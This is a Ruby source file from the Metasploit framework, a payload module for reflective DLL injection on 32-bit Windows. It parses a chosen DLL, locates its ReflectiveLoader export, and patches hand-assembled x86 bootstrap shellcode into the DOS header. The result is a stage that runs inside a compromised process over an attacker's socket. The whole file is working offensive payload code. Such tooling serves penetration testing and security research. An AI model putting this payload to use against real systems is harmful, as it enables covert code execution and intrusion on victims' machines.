# Copyright (c) 2008 Stephen Fewer of Harmony Security (www.harmonysecurity.com)

require 'msf/core'
require 'rex/peparsey'

module Msf
#module Payloads
#module Stages
#module Windows

###
#
# ReflectiveDllInject common module stub that is meant to be included in payloads 
# that make use of Reflective DLL Injection.
#
###
module Payload::Windows::ReflectiveDllInject

	include Msf::Payload::Windows

	def initialize(info = {})
		super(update_info(info,
			'Name'          => 'Reflective Dll Injection',
			'Version'       => '0.1',
			'Description'   => 'Inject a Dll via a reflective loader',
			'Author'        => [ 'Stephen Fewer <info@harmonysecurity.com>' ],
			'References'    => [ [ 'URL', 'http://www.harmonysecurity.com/ReflectiveDllInjection.html' ] ],
			'Platform'      => 'win',
			'Arch'          => ARCH_X86,
			'PayloadCompat' => { 'Convention' => 'sockedi' },
			'Stage'         => { 'Offsets' => { 'EXITFUNC' => [ 33, 'V' ] }, 'Payload' => "" } ))
      
		register_options( [ OptPath.new( 'DLL', [ true, "The local path to the Reflective DLL to upload" ] ), ], ReflectiveDllInject )
	end

	def library_path
		datastore['DLL']
	end

	def stage_payload
		dll    = ""
		index  = 0
		offset = 0
    
		# read in and parse the dll file...
		begin
			File.open( library_path, "rb" ) { |f|
				dll += f.read
			}

			pe = Rex::PeParsey::Pe.new( Rex::ImageSource::Memory.new( dll ) )
      		
			pe.exports.entries.each do |entry|
				if( entry.name =~ /^\S*ReflectiveLoader\S*/ )
					offset = pe.rva_to_file_offset( entry.rva )
					break
				end
			end

			if offset == 0 
				raise "Can't find an exported ReflectiveLoader function!"
			end
		rescue
			print_error( "Failed to read and parse Dll file: #{$!}" )
			return
		end
    
		# generate our bootstrap code...
		bootstrap =
			"\x4D" +                            # dec ebp             ; M
			"\x5A" +                            # pop edx             ; Z
			"\xE8\x00\x00\x00\x00" +            # call 0              ; call next instruction
			"\x5B" +                            # pop ebx             ; get our location (+7)
			"\x52" +                            # push edx            ; push edx back
			"\x45" +                            # inc ebp             ; restore ebp
			"\x55" +                            # push ebp            ; save ebp
			"\x89\xE5" +                        # mov ebp, esp        ; setup fresh stack frame
			"\x81\xC3" + [offset-7].pack( "V" ) + # add ebx, 0x???????? ; add offset to ReflectiveLoader
			"\xFF\xD3" +                        # call ebx            ; call ReflectiveLoader
			"\x89\xC3" +                        # mov ebx, eax        ; save DllMain for second call
			"\x57" +                            # push edi            ; our socket
			"\x68\x04\x00\x00\x00" +            # push 0x4            ; signal we have attached
			"\x50" +                            # push eax            ; some value for hinstance
			"\xFF\xD0" +                        # call eax            ; call DllMain( somevalue, DLL_METASPLOIT_ATTACH, socket )
			"\x68\xE0\x1D\x2A\x0A" +            # push 0x0A2A1DE0     ; our EXITFUNC placeholder (Default to ExitThread for migration)
			"\x68\x05\x00\x00\x00" +            # push 0x5            ; signal we have detached
			"\x50" +                            # push eax            ; some value for hinstance
			"\xFF\xD3"                          # call ebx            ; call DllMain( somevalue, DLL_METASPLOIT_DETACH, exitfunk )
			#                                                         ; we only return if we don't set a valid EXITFUNC

		# patch the bootstrap code into the dll's DOS header...
		while index < bootstrap.length
			dll[ index ] = bootstrap[ index ]
			index += 1
		end

		# return our stage to be loaded by the intermediate stager
		return dll
  end
  
end

end 

